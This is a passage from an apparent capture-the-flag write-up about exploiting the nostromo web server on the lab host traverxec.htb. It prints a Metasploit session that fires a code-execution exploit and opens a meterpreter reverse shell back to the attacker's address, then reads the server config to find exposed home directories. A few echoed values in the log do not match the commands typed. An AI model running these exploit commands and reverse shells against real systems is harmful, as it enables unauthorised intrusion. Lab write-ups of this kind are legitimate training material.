If we search for recent vulnerabilities for nostromo, we find CVE-2011-0751. While this vulnerability was originally meant for versions <=1.9.4, it turns out there is a variant of the same vulnerability for versions >=1.9.6.

If we search in Metasploit, we find a module for this vulnerability that also has support for >=1.9.6 versions.

Let's now set up this exploit, check for compatibility, and exploit.

```bash
msf5 > use exploit/multi/http/nostromo_code_exec 
msf5 exploit(multi/http/nostromo_code_exec) > set RHOST traverxec.htb
RHOST => traverxec.htb
msf5 exploit(multi/http/nostromo_code_exec) > check
msf5 exploit(multi/http/nostromo_code_exec) > set target 1
target => 1
[*] 10.10.10.165:80 - The target appears to be vulnerable.
msf5 exploit(multi/http/nostromo_code_exec) > set LHOST 10.10.14.120
LHOST => 10.10.14.120
msf5 exploit(multi/http/nostromo_code_exec) > set LPORT 4444
LPORT => 44444
msf5 exploit(multi/http/nostromo_code_exec) > set PAYLOAD linux/x64/meterpreter/reverse_tcp
PAYLOAD => linux/x64/meterpreter/reverse_tcp
msf5 exploit(multi/http/nostromo_code_exec) > exploit

[*] Started reverse TCP handler on 10.10.14.120:4444 
[*] Configuring Automatic (Linux Dropper) target
[*] Sending linux/x64/meterpreter/reverse_tcp command stager
[*] Sending stage (3021284 bytes) to 10.10.10.165
[*] Meterpreter session 1 opened (10.10.14.120:4444 -> 10.10.10.165:53586) at 2020-01-20 17:12:05 -0500
[*] Command Stager progress - 100.00% done (823/823 bytes)

meterpreter > 
```

Let's take a look again at the nostromo server. Normally we can expect web servers to host from `/var/www` but this one is from `/var/nostromo` indicating some custom configuration.

```bash
meterpreter > cd /var/nostromo/conf
meterpreter > cat nhttpd.conf
...
```

Looking at sample configuration files online and comparing to this, we see an interesting difference at the bottom.

```bash
# HOMEDIRS [OPTIONAL]
homedirs		    /home
homedirs_public		public_www
```

The homedirs functionality is usually commented out but here it is being used. Looking at the [nhttpd documentation](https://www.gsp.com/cgi-bin/man.cgi?section=8&topic=nhttpd), we see that this enables us to view users' home directories by using `/~user`. If we go to `http://traverxec.htb/~david`, we see his private page.